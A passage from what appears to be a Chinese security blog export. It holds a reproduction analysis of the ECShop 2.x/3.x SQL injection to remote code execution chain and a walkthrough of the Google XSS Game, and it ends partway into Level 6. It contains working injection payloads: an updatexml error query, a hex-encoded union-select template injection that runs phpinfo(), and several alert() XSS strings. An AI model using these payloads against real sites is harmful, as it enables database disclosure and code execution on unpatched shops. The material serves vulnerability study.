<p></p><figure class="highlight sql hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">SELECT</span> a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, p.ad_height, p.position_style, <span class="hljs-keyword">RAND</span>() <span class="hljs-keyword">AS</span> rnd <span class="hljs-keyword">FROM</span> <span class="hljs-string">`ecshop360`</span>.<span class="hljs-string">`ecs_ad`</span> <span class="hljs-keyword">AS</span> a <span class="hljs-keyword">LEFT</span> <span class="hljs-keyword">JOIN</span> <span class="hljs-string">`ecshop360`</span>.<span class="hljs-string">`ecs_ad_position`</span> <span class="hljs-keyword">AS</span> p <span class="hljs-keyword">ON</span> a.position_id = p.position_id <span class="hljs-keyword">WHERE</span> enabled = <span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> start_time &lt;= <span class="hljs-string">&apos;1606229787&apos;</span> <span class="hljs-keyword">AND</span> end_time &gt;= <span class="hljs-string">&apos;1606229787&apos;</span> <span class="hljs-keyword">AND</span> a.position_id = <span class="hljs-string">&apos;1&apos;</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,<span class="hljs-keyword">make_set</span>(<span class="hljs-number">3</span>,<span class="hljs-string">&apos;~&apos;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">version</span>())),<span class="hljs-number">1</span>)<span class="hljs-comment">#&apos; ORDER BY rnd LIMIT 669</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201124225708206.png" alt="image-20201124225708206"></p>
<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>&#x56DE;&#x987E; <code>/includes/lib_insert.php#insert_ads</code>  </p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">insert_ads</span><span class="hljs-params">($arr)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">    <span class="hljs-keyword">static</span> $static_res = <span class="hljs-keyword">NULL</span>;</span><br><span class="line"></span><br><span class="line">    $time = gmtime();</span><br><span class="line">    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>($arr[<span class="hljs-string">&apos;num&apos;</span>]) &amp;&amp; $arr[<span class="hljs-string">&apos;num&apos;</span>] != <span class="hljs-number">1</span>)</span><br><span class="line">    {</span><br><span class="line">        $sql  = <span class="hljs-string">&apos;SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, &apos;</span> .</span><br><span class="line">                    <span class="hljs-string">&apos;p.ad_height, p.position_style, RAND() AS rnd &apos;</span> .</span><br><span class="line">                <span class="hljs-string">&apos;FROM &apos;</span> . $GLOBALS[<span class="hljs-string">&apos;ecs&apos;</span>]-&gt;table(<span class="hljs-string">&apos;ad&apos;</span>) . <span class="hljs-string">&apos; AS a &apos;</span>.</span><br><span class="line">                <span class="hljs-string">&apos;LEFT JOIN &apos;</span> . $GLOBALS[<span class="hljs-string">&apos;ecs&apos;</span>]-&gt;table(<span class="hljs-string">&apos;ad_position&apos;</span>) . <span class="hljs-string">&apos; AS p ON a.position_id = p.position_id &apos;</span> .</span><br><span class="line">                <span class="hljs-string">&quot;WHERE enabled = 1 AND start_time &lt;= &apos;&quot;</span> . $time . <span class="hljs-string">&quot;&apos; AND end_time &gt;= &apos;&quot;</span> . $time . <span class="hljs-string">&quot;&apos; &quot;</span>.</span><br><span class="line">                    <span class="hljs-string">&quot;AND a.position_id = &apos;&quot;</span> . $arr[<span class="hljs-string">&apos;id&apos;</span>] . <span class="hljs-string">&quot;&apos; &quot;</span> .</span><br><span class="line">                <span class="hljs-string">&apos;ORDER BY rnd LIMIT &apos;</span> . $arr[<span class="hljs-string">&apos;num&apos;</span>];</span><br><span class="line">        $res = $GLOBALS[<span class="hljs-string">&apos;db&apos;</span>]-&gt;GetAll($sql);</span><br><span class="line">    }</span><br><span class="line">    $ads = <span class="hljs-keyword">array</span>();</span><br><span class="line">    $position_style = <span class="hljs-string">&apos;&apos;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">foreach</span> ($res <span class="hljs-keyword">AS</span> $row)</span><br><span class="line">    {</span><br><span class="line">        <span class="hljs-keyword">if</span> ($row[<span class="hljs-string">&apos;position_id&apos;</span>] != $arr[<span class="hljs-string">&apos;id&apos;</span>])</span><br><span class="line">        {</span><br><span class="line">            <span class="hljs-keyword">continue</span>;</span><br><span class="line">        }</span><br><span class="line">	</span><br><span class="line">      &#xB7;&#xB7;&#xB7;&#xB7;&#xB7;&#xB7;&#xB7;&#xB7;</span><br><span class="line">  </span><br><span class="line">    $position_style = <span class="hljs-string">&apos;str:&apos;</span> . $position_style;</span><br><span class="line"></span><br><span class="line">    $need_cache = $GLOBALS[<span class="hljs-string">&apos;smarty&apos;</span>]-&gt;caching;</span><br><span class="line">    $GLOBALS[<span class="hljs-string">&apos;smarty&apos;</span>]-&gt;caching = <span class="hljs-keyword">false</span>;</span><br><span class="line"></span><br><span class="line">    $GLOBALS[<span class="hljs-string">&apos;smarty&apos;</span>]-&gt;assign(<span class="hljs-string">&apos;ads&apos;</span>, $ads);</span><br><span class="line">    $val = $GLOBALS[<span class="hljs-string">&apos;smarty&apos;</span>]-&gt;fetch($position_style);</span><br><span class="line"></span><br><span class="line">    $GLOBALS[<span class="hljs-string">&apos;smarty&apos;</span>]-&gt;caching = $need_cache;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> $val;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x5728;&#x8FD9;&#x4E00;&#x6B65;&#x5173;&#x952E;&#x7684;&#x9644;&#x503C;&#xFF0C;<code>$row[&apos;position_style&apos;]</code> &#x6765;&#x81EA;<code>$res = $GLOBALS[&apos;db&apos;]-&gt;GetAll($sql)</code> &#x67E5;&#x8BE2;&#x540E; <code>foreach</code> &#x904D;&#x5386;&#x7684;&#x7ED3;&#x679C;&#x3002;&#x6709;&#x51E0;&#x4E2A;&#x5173;&#x6CE8;&#x7684;&#x70B9;&#xFF1A;</p>
<ol>
<li>&#x9996;&#x5148;&#x5173;&#x6CE8; <code>$position_style</code>  &#x8FD9;&#x4E2A;&#x53D8;&#x91CF;</li>
<li>&#x5173;&#x6CE8; <code>$row[&apos;position_id&apos;] != $arr[&apos;id&apos;]</code> &#xFF08;&#x76F8;&#x7B49;&#x8C03;&#x7528; <code>$position_style = $row[&apos;position_style&apos;];</code>&#xFF09;</li>
</ol>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125194129600.png" alt="image-20201125194129600"></p>
<p>&#x5728;&#x4E0B;&#x9762;&#x5B8C;&#x6210;&#x62FC;&#x63A5;</p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125120549159.png" alt="image-20201125120549159"></p>
<p>&#x4F1A;&#x8C03;&#x7528;   <code>fetch</code></p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125011036242.png" alt="image-20201125011036242"></p>
<p><code>/includes/cls_template.php</code> 145 &#x884C;&#x662F;&#x4E00;&#x4E2A;&#x5173;&#x952E;&#x70B9;&#x3002;&#x65E0;&#x975E;&#x4E24;&#x4E2A;&#x51FD;&#x6570;&#xFF1A;</p>
<ol>
<li><code>fetch_str</code></li>
<li><code>_eval</code></li>
</ol>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125120749172.png" alt="image-20201125120749172"></p>
<p>&#x80AF;&#x5B9A;&#x9996;&#x5148;&#x5F97; <code>fetch_str</code> &#x5904;&#x7406;&#x622A;&#x65AD;&#x540E;&#x7684; <code>filename</code> &#xFF0C;&#x4E5F;&#x5C31;&#x662F;<br></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line">{$asd<span class="hljs-string">&apos;];phpinfo\t();//}xxx</span></span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x540E;&#x9762;&#x7ECF;&#x8FC7;&#x4E00;&#x987F;&#x64CD;&#x4F5C;&#xFF0C;&#x5404;&#x79CD;&#x66FF;&#x6362;&#x4E4B;&#x540E;&#xFF0C;&#x539F;&#x6765;&#x7684;&#x503C;&#x53D8;&#x6210;&#x4E86; <code>$asd&apos;];phpinfo\t();//</code> </p>
<p>&#x8FDB;&#x5165; <code>select</code> &#x51FD;&#x6570;&#xFF0C;&#x5173;&#x952E;&#x70B9;&#x5982;&#x4E0B;&#x3002;&#x8FD4;&#x56DE;&#x503C;&#x662F;&#x76F4;&#x63A5; php echo &#x51FA;&#x6765;&#x7684;</p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125124304197.png" alt="image-20201125124304197"></p>
<p>&#x540E;&#x9762;&#x7684;&#x8FC7;&#x7A0B;&#x5728;&#x7B2C;&#x4E00;&#x6B21;&#x5206;&#x6790;&#x7684;&#x65F6;&#x5019;&#x662F;&#x61F5;&#x903C;&#x7684;&#xFF0C;&#x5176;&#x5B9E;&#x662F;&#x7F3A;&#x4E4F;&#x4E86;&#x5BF9;&#x524D;&#x9762; SQL &#x8BED;&#x53E5;&#x7684;&#x5927;&#x5C40;&#x89C2;&#xFF0C;&#x800C;&#x4E14;&#x6D41;&#x7A0B;&#x5F88;&#x6742;&#xFF0C;&#x5404;&#x79CD; <code>replace</code> &#x7684;&#x66FF;&#x6362;&#x548C;&#x5404;&#x79CD; <code>if</code>&#x3002;</p>
<p>@badcode &#x4ECE;&#x5B8F;&#x89C2;&#x4E0A;&#x603B;&#x7ED3;&#x7684; SQL &#x8BED;&#x53E5;&#x548C;&#x6700;&#x540E; <code>position_style</code> &#x7684;&#x5173;&#x7CFB;&#x5DF2;&#x7ECF;&#x5F88;&#x7B80;&#x6D01;&#x4E86;&#x3002;&#x6211;&#x8FD9;&#x91CC;&#x4E0D;&#x518D;&#x590D;&#x8FF0;</p>
<blockquote>
<p>&#x63A5;&#x4E0B;&#x6765;&#x5C31;&#x662F;&#x628A;&#x6784;&#x9020;&#x597D;&#x7684;&#x4EE3;&#x7801;&#x901A;&#x8FC7;SQL&#x6CE8;&#x5165;&#x6F0F;&#x6D1E;&#x4F20;&#x7ED9;<code>$position_style</code>&#x3002; &#x8FD9;&#x91CC;&#x53EF;&#x4EE5;&#x7528;union select &#x6765;&#x63A7;&#x5236;&#x67E5;&#x8BE2;&#x7684;&#x7ED3;&#x679C;&#xFF0C;&#x6839;&#x636E;&#x4E4B;&#x524D;&#x7684;&#x6D41;&#x7A0B;&#xFF0C;<code>$row[&apos;position_id&apos;]</code>&#x548C;<code>$arr[&apos;id&apos;]</code>&#x8981;&#x76F8;&#x7B49;&#xFF0C;<code>$row[&apos;position_id&apos;]</code>&#x662F;&#x7B2C;&#x4E8C;&#x5217;&#x7684;&#x7ED3;&#x679C;&#xFF0C;<code>$position_style</code>&#x662F;&#x7B2C;&#x4E5D;&#x5217;&#x7684;&#x7ED3;&#x679C;&#x3002;<code>$arr[&apos;id&apos;]</code>&#x4F20;&#x5165;<code>&apos; /*</code>,<code>$arr[&apos;num&apos;]</code>&#x4F20;&#x5165;<code>*/ union select 1,0x27202f2a,3,4,5,6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10-- -</code>&#xFF0C;<code>0x27202f2a</code>&#x662F;<code>&apos; /*</code>&#x7684;16&#x8FDB;&#x5236;&#x503C;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;<code>$row[&apos;position_id&apos;]</code>&#x7684;&#x503C;&#xFF0C;<code>0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d</code>&#x662F;&#x4E0A;&#x9762;&#x6784;&#x9020;&#x7684;php&#x4EE3;&#x7801;&#x7684;16&#x8FDB;&#x5236;&#x503C;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;<code>$position_style</code>&#x3002;</p>
</blockquote>
<p><code>get_var</code> &#x4E2D;&#x4F1A;&#x8C03;&#x7528; <code>make_var</code>&#xFF0C;&#x6700;&#x540E;&#x8FD4;&#x56DE;&#x503C;</p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125125626867.png" alt="image-20201125125626867"></p>
<p>&#x8BBA; <code>$position_style</code> &#x7684;&#x6F14;&#x53D8;</p>
<p></p><figure class="highlight php hljs"><table><tbody><tr><td class="code"><pre><span class="line">{$asd<span class="hljs-string">&apos;];phpinfo\t();//}xxx</span></span><br><span class="line"><span class="hljs-string">$res = $static_res[$arr[&apos;</span>id<span class="hljs-string">&apos;]]; -&gt; foreach ($res AS $row) -&gt; $position_style = $row[&apos;</span>position_style<span class="hljs-string">&apos;];</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">str:{$asd&apos;</span>];phpinfo\t();<span class="hljs-comment">//}xxx</span></span><br><span class="line">$position_style = <span class="hljs-string">&apos;str:&apos;</span> . $position_style;</span><br><span class="line"> </span><br><span class="line">$asd<span class="hljs-string">&apos;];phpinfo\t();//}xxx</span></span><br><span class="line"><span class="hljs-string">return preg_replace_callback(&quot;/{([^\}\{\n]*)}/&quot;, function($r) use(&amp;$template){return $template-&gt;select($r[1]);}, $source);</span></span><br><span class="line"><span class="hljs-string"></span></span><br><span class="line"><span class="hljs-string">asd&apos;</span>];phpinfo\t();<span class="hljs-comment">//</span></span><br><span class="line"><span class="hljs-keyword">elseif</span> ($tag{<span class="hljs-number">0</span>} == <span class="hljs-string">&apos;$&apos;</span>){<span class="hljs-keyword">return</span> <span class="hljs-string">&apos;&lt;?php echo &apos;</span> . <span class="hljs-keyword">$this</span>-&gt;get_val(substr($tag, <span class="hljs-number">1</span>)) . <span class="hljs-string">&apos;; ?&gt;&apos;</span>;}</span><br><span class="line"> </span><br><span class="line"><span class="hljs-keyword">$this</span>-&gt;_var[<span class="hljs-string">&apos;asd&apos;</span>];phpinfo\t();<span class="hljs-comment">//&apos;]</span></span><br><span class="line"><span class="hljs-keyword">foreach</span> ($t <span class="hljs-keyword">AS</span> $val) { $p.= <span class="hljs-string">&apos;[\&apos;&apos;</span> . $val . <span class="hljs-string">&apos;\&apos;]&apos;</span>; }</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>&#x6700;&#x540E;&#x8F93;&#x51FA; <code>phpinfo()</code></p>
<p><img src="/2020/11/21/ECShop-2-x-3-x-%E7%89%88%E6%9C%AC-RCE-%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/image-20201125130011473.png" alt="image-20201125130011473"></p>
<h1 id="4-0-SQLi"><a href="#4-0-SQLi" class="headerlink" title="4.0 SQLi"></a>4.0 SQLi</h1><p>&#x6CA1;&#x627E;&#x5230;&#x5B89;&#x88C5;&#x5305;233333&#x2026;&#x5148;&#x5495;&#x5495;&#x5495;&#x4E86;&#xFF5E;&#xFF5E;&#xFF5E;</p>
<p><a href="https://mp.weixin.qq.com/s/xHioArEpoAqGlHJPfq3Jiw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/xHioArEpoAqGlHJPfq3Jiw</a></p>
<p><a href="http://foreversong.cn/archives/1556" target="_blank" rel="noopener">http://foreversong.cn/archives/1556</a></p>
<h1 id="&#x53C2;&#x8003;&#x94FE;&#x63A5;"><a href="#&#x53C2;&#x8003;&#x94FE;&#x63A5;" class="headerlink" title="&#x53C2;&#x8003;&#x94FE;&#x63A5;"></a>&#x53C2;&#x8003;&#x94FE;&#x63A5;</h1><p><a href="https://paper.seebug.org/695/" target="_blank" rel="noopener">https://paper.seebug.org/695/</a></p>
</body></html>]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Google XSS Game</title>
    <url>/2019/03/27/Google-XSS-Game/</url>
    <content><![CDATA[<html><head></head><body><p>&#x9898;&#x76EE;&#x5730;&#x5740;&#xFF1A;<a href="https://xss-game.appspot.com" target="_blank" rel="noopener">https://xss-game.appspot.com</a></p>
<a id="more"></a>

<p><img src="/2019/03/27/Google-XSS-Game/nfDPyJSFbqucHWr.jpg" alt></p>
<p>&#x5237;&#x5B8C;&#x4E86;&#x9898;&#x4F1A;&#x53D1;&#x73B0;&#xFF0C;&#x5176;&#x5B9E;&#x8FD9;&#x4E2A; XSS&#x5C0F;&#x7EC3;&#x4E60; &#x5E76;&#x6CA1;&#x6709;&#x901A;&#x8FC7;&#x5F88;&#x4E25;&#x683C;&#x7684;&#x8FC7;&#x6EE4;&#x6765;&#x8003;&#x5BDF; XSS &#x7684;&#x4E00;&#x4E9B; Bypass &#x624B;&#x6BB5;&#x548C;&#x4E0D;&#x540C;&#x6D4F;&#x89C8;&#x5668;&#x7684;&#x4E00;&#x4E9B;&#x7279;&#x6027;&#x3002;&#x4F46;&#x5B83;&#x901A;&#x8FC7;&#x516D;&#x9053;&#x9898;&#x57FA;&#x672C;&#x6982;&#x62EC;&#x4E86;&#x4E00;&#x4E9B; XSS &#x7684;&#x7C7B;&#x578B;&#x548C;<strong>&#x5E38;&#x89C1;&#x7684;&#x89E6;&#x53D1;&#x70B9;</strong>&#x4EE5;&#x53CA;&#x89E6;&#x53D1;&#x65B9;&#x5F0F;&#x3002;&#x5176;&#x5B9E;&#x8FD8;&#x662F;&#x6709;&#x5F88;&#x591A;&#x5730;&#x65B9;&#x503C;&#x5F97;&#x6211;&#x4EEC;&#x6DF1;&#x601D;&#x3002;</p>
<h2 id="Level-1-Hello-world-of-XSS"><a href="#Level-1-Hello-world-of-XSS" class="headerlink" title="Level 1: Hello, world of XSS"></a>Level 1: Hello, world of XSS</h2><p>XSS&#x7C7B;&#x578B;&#xFF1A;Reflected XSS</p>
<p>&#x8FC7;&#x6EE4;&#x60C5;&#x51B5;&#xFF1A;&#x65E0;&#x8FC7;&#x6EE4;</p>
<p>&#x5F71;&#x54CD;&#x8303;&#x56F4;&#xFF1A; &#x70B9;&#x51FB;&#x6076;&#x610F;&#x94FE;&#x63A5;&#x7684;&#x7528;&#x6237;</p>
<p>&#x89E6;&#x53D1;XSS&#x4F4D;&#x7F6E;&#xFF1A; &#x641C;&#x7D22;&#x6846;<br><img src="/2019/03/27/Google-XSS-Game/3juqO8JFnAgpDMt.jpg" alt></p>
<p>payload&#xFF1A; <code>&lt;script&gt;alert(&apos;P2hm1n&apos;)&lt;/script&gt;</code></p>
<p><img src="/2019/03/27/Google-XSS-Game/1whKxb6AJlXyUEL.jpg" alt></p>
<h2 id="Level-2-Persistence-is-key"><a href="#Level-2-Persistence-is-key" class="headerlink" title="Level 2: Persistence is key"></a>Level 2: Persistence is key</h2><p>XSS&#x7C7B;&#x578B;&#xFF1A;Stored XSS</p>
<p>&#x8FC7;&#x6EE4;&#x60C5;&#x51B5;&#xFF1A;&#x8FC7;&#x6EE4; <code>&lt;script&gt;</code> &#x6807;&#x7B7E;</p>
<p>Bypass&#xFF1A; &#x5229;&#x7528;&#x5176;&#x4ED6;&#x6807;&#x7B7E;</p>
<p>&#x5F71;&#x54CD;&#x8303;&#x56F4;&#xFF1A; &#x6240;&#x6709;&#x80FD;&#x770B;&#x89C1;&#x5E16;&#x5B50;&#x7684;&#x7528;&#x6237;</p>
<p>&#x89E6;&#x53D1;XSS&#x4F4D;&#x7F6E;&#xFF1A;&#x7559;&#x8A00;&#x677F;<br>&#x6269;&#x5C55;&#x601D;&#x8DEF;&#xFF1A;&#x53D1;&#x9001;&#x5E16;&#x5B50;&#x7B49;&#x5B58;&#x50A8;&#x4F4D;&#x7F6E;<br><img src="/2019/03/27/Google-XSS-Game/3V81XuZe9l42wAz.jpg" alt></p>
<p>payload&#xFF1A; <code>&lt;img src=x onerror=alert(&apos;P2hm1n&apos;)&gt;</code></p>
<p><img src="/2019/03/27/Google-XSS-Game/sKI5NrUBjptQEuH.jpg" alt></p>
<h2 id="Level-3-That-sinking-feeling&#x2026;"><a href="#Level-3-That-sinking-feeling&#x2026;" class="headerlink" title="Level 3: That sinking feeling&#x2026;"></a>Level 3: That sinking feeling&#x2026;</h2><p>XSS&#x7C7B;&#x578B;&#xFF1A;DOM XSS</p>
<p>&#x8FC7;&#x6EE4;&#x60C5;&#x51B5;&#xFF1A;&#x65E0;&#x8FC7;&#x6EE4;</p>
<p>&#x5F71;&#x54CD;&#x8303;&#x56F4;&#xFF1A; &#x70B9;&#x51FB;&#x6076;&#x610F;&#x94FE;&#x63A5;&#x7684;&#x7528;&#x6237;</p>
<p>&#x89E6;&#x53D1;XSS&#x4F4D;&#x7F6E;&#xFF1A;&#x9009;&#x62E9;&#x6D4F;&#x89C8;&#x56FE;&#x7247;&#x5904;<br>&#x6269;&#x5C55;&#x601D;&#x8DEF;&#xFF1A;&#x901A;&#x8FC7; JS &#x9009;&#x62E9;&#x56FE;&#x7247;<br><img src="/2019/03/27/Google-XSS-Game/eCWlUcKuzBaFfP6.jpg" alt></p>
<p><strong>&#x7B80;&#x5355;&#x5206;&#x6790;&#x5982;&#x4E0B;</strong></p>
<p>&#x6F0F;&#x6D1E;&#x4EE3;&#x7801;&#xFF1A;</p>
<p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="code"><pre><span class="line"><span class="hljs-keyword">var</span> html = <span class="hljs-string">&quot;Image &quot;</span> + <span class="hljs-built_in">parseInt</span>(num) + <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">html += <span class="hljs-string">&quot;&lt;img src=&apos;/static/level3/cloud&quot;</span> + num + <span class="hljs-string">&quot;.jpg&apos; /&gt;&quot;</span>;</span><br><span class="line">$(<span class="hljs-string">&apos;#tabContent&apos;</span>).html(html);</span><br><span class="line"><span class="hljs-built_in">window</span>.location.hash = num;</span><br></pre></td></tr></tbody></table></figure><p></p>
<p><img src="/2019/03/27/Google-XSS-Game/E8zpnublN1FOXYM.jpg" alt></p>
<p>&#x5982;&#x679C;&#x4E0D;&#x770B;&#x4EE3;&#x7801;&#x76F2;&#x6D4B;&#x4F1A;&#x53D1;&#x73B0; <code>#</code> &#x540E;&#x9762;&#x7684;&#x4E1C;&#x897F;&#x90FD;&#x4F1A;&#x88AB;&#x95ED;&#x5408;&#x5230; <code>&lt;img src=&quot;&quot;&gt;</code> &#x91CC;&#x9762;&#x7684; <code>src</code> &#x5C5E;&#x6027;&#x4E2D;&#x3002;&#x60F3;&#x8981;&#x9003;&#x9038;&#x51FA;&#x6765;&#x7684;&#x8BDD;&#x53EA;&#x80FD;&#x6DFB;&#x52A0; <code>&apos;</code> &#x4E00;&#x4E2A;&#x5355;&#x5F15;&#x53F7;&#xFF0C;&#x6765;&#x95ED;&#x5408;&#x524D;&#x9762;&#x7684;&#x8BED;&#x53E5;<br>&#x9003;&#x9038;&#x5355;&#x5F15;&#x53F7;&#x4E4B;&#x540E;&#xFF0C;&#x5229;&#x7528;&#x4E8B;&#x4EF6;&#x5F39;&#x7A97;&#xFF0C;&#x6216;&#x8005;&#x95ED;&#x5408;&#x4E4B;&#x524D;&#x6807;&#x7B7E;&#x3002;&#x5747;&#x53EF;&#x89E6;&#x53D1; XSS</p>
<p>payload1&#xFF1A; <code>1&apos; onerror=alert(&apos;P2hm1n&apos;) &apos;</code><br>payload2&#xFF1A; <code>1&apos; &lt;img src=x onerror=alert(&apos;P2hm1n&apos;)&gt;&lt;</code></p>
<p><img src="/2019/03/27/Google-XSS-Game/aHOcutyTvQi32qz.jpg" alt></p>
<h2 id="Level-4-Context-matters"><a href="#Level-4-Context-matters" class="headerlink" title="Level 4: Context matters"></a>Level 4: Context matters</h2><p>XSS&#x7C7B;&#x578B;&#xFF1A;DOM XSS</p>
<p>&#x8FC7;&#x6EE4;&#x60C5;&#x51B5;&#xFF1A;&#x8FC7;&#x6EE4;&#x5206;&#x53F7;</p>
<p>Bypass&#xFF1A; &#x5229;&#x7528; URL &#x7F16;&#x7801;</p>
<p>&#x5F71;&#x54CD;&#x8303;&#x56F4;&#xFF1A; &#x70B9;&#x51FB;&#x6076;&#x610F;&#x94FE;&#x63A5;&#x7684;&#x7528;&#x6237;</p>
<p>&#x89E6;&#x53D1;XSS&#x4F4D;&#x7F6E;&#xFF1A;&#x8BA1;&#x65F6;&#x5668;&#xFF1B;<br>&#x6269;&#x5C55;&#x601D;&#x8DEF;&#xFF1A;&#x6240;&#x6709;&#x53EF;&#x80FD;&#x81EA;&#x5B9A;&#x4E49;JS&#x51FD;&#x6570;&#x7684;&#x4F4D;&#x7F6E;</p>
<p><img src="/2019/03/27/Google-XSS-Game/icXRJHse5gFafDV.jpg" alt></p>
<p><strong>&#x7B80;&#x5355;&#x5206;&#x6790;&#x5982;&#x4E0B;</strong><br>&#x81EA;&#x5B9A;&#x4E49;&#x4E86;&#x4E00;&#x4E2A;JS&#x51FD;&#x6570;&#xFF0C;&#x524D;&#x7AEF;&#x8F93;&#x5165;&#x7684;&#x503C;&#x7C7B;&#x4F3C;&#x4E00;&#x4E2A;&#x8BA1;&#x65F6;&#x5668;&#x3002;&#x5230;&#x4E86;&#x54CD;&#x5E94;&#x7684;&#x79D2;&#x6570;&#x4F1A;&#x63D0;&#x793A;&#x5230;&#x65F6;&#x95F4;&#x4E86;&#x3002;<br>&#x8F93;&#x5165;&#x7684;&#x6570;&#x5B57;&#x4F1A;&#x8FDB;&#x5165; JS &#x51FD;&#x6570;&#x7684;&#x53D8;&#x91CF;&#x3002;&#x4E3A;&#x4E86;&#x65B9;&#x4FBF;&#x8FDB;&#x884C;&#x4EE3;&#x7801;&#x5206;&#x6790;&#xFF0C;&#x5C06;&#x8F93;&#x5165;&#x7684;&#x6570;&#x5B57;&#x8C03;&#x5927;&#xFF0C;&#x8F93;&#x5165; <code>123</code> &#x76F8;&#x5E94; JS &#x8F93;&#x51FA;&#x4F4D;&#x7F6E; <code>&lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer(&apos;123&apos;);&quot;&gt;</code><br>&#x6838;&#x5FC3;&#x601D;&#x8DEF;&#xFF1A;1. &#x95ED;&#x5408; <code>(&apos;</code>   2. &#x5229;&#x7528;&#x5206;&#x53F7;  3. &#x5229;&#x7528; <code>||</code></p>
<p>payload1: <code>123&apos;) || alert(&apos;P2hm1n</code><br>payload2: <code>1&apos;)%3Balert(&apos;P2hm1n</code></p>
<p><img src="/2019/03/27/Google-XSS-Game/PhqEXbvpaSl8BHG.jpg" alt></p>
<h2 id="Level-5-Breaking-protocol"><a href="#Level-5-Breaking-protocol" class="headerlink" title="Level 5: Breaking protocol"></a>Level 5: Breaking protocol</h2><p>XSS&#x7C7B;&#x578B;&#xFF1A;Reflected XSS</p>
<p>&#x8FC7;&#x6EE4;&#x60C5;&#x51B5;&#xFF1A;&#x65E0;&#x8FC7;&#x6EE4;</p>
<p>&#x5F71;&#x54CD;&#x8303;&#x56F4;&#xFF1A; &#x70B9;&#x51FB;&#x6076;&#x610F;&#x94FE;&#x63A5;&#x7684;&#x7528;&#x6237;</p>
<p>&#x89E6;&#x53D1;XSS&#x4F4D;&#x7F6E;&#xFF1A;&#x6CE8;&#x518C;&#x7528;&#x6237;<br>&#x6269;&#x5C55;&#x601D;&#x8DEF;&#xFF1A;&#x6240;&#x6709;&#x94FE;&#x63A5;&#x8DF3;&#x8F6C;&#x4F4D;&#x7F6E;<br><img src="/2019/03/27/Google-XSS-Game/TDYp3IxwkdXmjh7.jpg" alt></p>
<p><strong>&#x7B80;&#x5355;&#x5206;&#x6790;&#x5982;&#x4E0B;</strong><br>&#x9996;&#x9875;&#x6CA1;&#x6709;&#x53EF;&#x4EE5;&#x548C;&#x7528;&#x6237;&#x4EA4;&#x4E92;&#x7684;&#x70B9;&#xFF0C;&#x70B9;&#x51FB; Sign up &#x8DF3;&#x8F6C;&#x81F3;&#x6CE8;&#x518C;&#x9875;&#x9762;&#x3002;&#x89C2;&#x5BDF; URL &#x4E3A; <code>https://xss-game.appspot.com/level5/frame/signup?next=confirm</code><br>&#x67E5;&#x627E; <code>confirm</code> &#x54CD;&#x5E94; JS &#x8F93;&#x51FA;&#x4F4D;&#x7F6E; <code>&lt;a href=&quot;confirm&quot;&gt;</code><br>&#x76F4;&#x63A5;&#x5229;&#x7528; JS &#x4F2A;&#x534F;&#x8BAE;</p>
<p>payload&#xFF1A; <code>javascript:alert(&apos;P2hm1n&apos;)</code></p>
<p><img src="/2019/03/27/Google-XSS-Game/Ffnk4CKlG1mNOas.jpg" alt></p>
<h2 id="Level-6-Follow-the-&#x1F407;"><a href="#Level-6-Follow-the-&#x1F407;" class="headerlink" title="Level 6: Follow the &#x1F407;"></a>Level 6: Follow the &#x1F407;</h2><p>&#x8FD9;&#x7C7B; XSS &#x662F;&#x6211;&#x5728;&#x4E4B;&#x524D;&#x6CA1;&#x6709;&#x9047;&#x5230;&#x8FC7;&#x7684;&#x3002;&#x4E00;&#x5F00;&#x59CB;&#x76F2;&#x6D4B;&#x65F6;&#x4E5F;&#x6CA1;&#x6709;&#x601D;&#x8DEF;</p>
